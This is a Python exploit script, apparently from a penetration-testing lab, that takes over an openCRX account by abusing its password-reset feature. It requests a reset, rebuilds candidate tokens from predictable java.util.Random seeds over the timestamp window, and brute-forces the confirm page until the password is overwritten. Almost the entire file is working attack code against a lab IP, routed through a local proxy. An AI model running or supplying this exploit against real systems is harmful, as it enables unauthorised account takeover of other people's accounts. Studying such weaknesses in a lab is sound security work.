#!/usr/bin/enc/python3
import time
import requests
import javarandom
import sys
import argparse

def getRandomBase62(randomObject, length=40):
    """
    This function will be used to generate the token for opencrx password reset
    """
    string = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    s = ""

    for i in range(length):
        s = s + string[randomObject.nextInt(62)]

    return s

def generateTokenList(st, ed):
    """
    Genereate the tokens to use in a password reset attempt
    """
    print("(*) Generating Tokens")

    tokens = []

    for t in range(st, ed):
        randomObject = javarandom.Random(t)
        tokens.append(getRandomBase62(randomObject))


    with open ('./python_tokens.txt', 'wt+') as myFile:
        myFile.write('\n'.join(tokens))

    return tokens

def resetPassword(token_list, host="192.168.137.126", password="password", principal="guest", provider="CRX", segment="Standard"):
    """
    This function will perform the password reset
    """

    print("(+) Requesting a new password")
    id = principal
    p = provider
    s = segment
    
    proxies = {"http": "http://127.0.0.1:8080"}
    url = "http://{}:8080/opencrx-core-CRX/PasswordResetConfirm.jsp".format(host)


    for t in token_list:
        t = t.rstrip()
        print(t)
        data = {
                't': t,
                'p': p,
                's': s,
                'id': id,
                'password1': password,
                'password2': password
                }

        r = requests.post(url, data=data, proxies=proxies)
        res = r.text

        if "Unable to reset password" not in res:
            print("(+) Pasword Reset with token: {}".format(t))
            print("(+) New Password: {}".format(password))
            sys.exit(0)
            break


    """
    with open(token_list, 'r') as f:
        for word in f:
            data = {
                    't': word.rstrip(),
                    'p': 'CRX',
                    's': 'Standard',
                    'id': 'guest',
                    'password1': password,
                    'password2': password
                    }

            r = requests.post(url, data=data, proxies=proxies)

            if "Unable to reset password" not in r.text:
                print("(+) Pasword Reset with token: {}".format(data))
                print("(+) New Password: {}".format(password1))
                break

    """


    print("(-)Unable to find a valid token")
    sys.exit(-1)

def requestPasswordReset(host="192.168.137.126", user="guest"):
    """
    This function will perform a password reset 
    """
    print("(*) Requesting Password Reset")
    print("args.user: {}".format(user))

    proxies = {"http": "http://127.0.0.1:8080"}
    url = "http://{}:8080/opencrx-core-CRX/RequestPasswordReset.jsp".format(host)
    data = { "id": '{}@{}/{}'.format(user, "CRX", "Standard") }
    print(data)

    r = requests.post(url, data=data, proxies=proxies)
    print(r.text)
    print(r.headers)

    if "Password reset request successful" in r.text:
        print("(*) Success in generating a reset for the password")
        return int(time.time() * 1000)
    else:
        print("(-) Could not request password reset")
        sys.exit(-1)



def main():
    """
    This is the main function
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('--user', '-user', nargs = '?', default = 'guest')
    parser.add_argument('--password', '-password', nargs = '?', default = 'password')
    args = parser.parse_args()
    print("args.id: {}".format(args.user))

    start_time = int(time.time() * 1000)
    end_time = requestPasswordReset(user=args.user)
    print("start_time: {}".format(start_time))
    print("end_time: {}".format(end_time))
    tokens = generateTokenList(start_time, end_time)
    #resetPassword(tokens, host="192.168.137.126", password1="hax0r1234", password2="haxor1234", principal="guest", provider="CRX", segment="Standard")
    #resetPassword(token_list, host="192.168.137.126", password="password", principal="guest", provider="CRX", segment="Standard")
    resetPassword(tokens, password=args.password, principal=args.user)
    #resetPassword(tokens)
    #resetPassword('./java_tokens.txt')

if __name__ == "__main__":
    main()

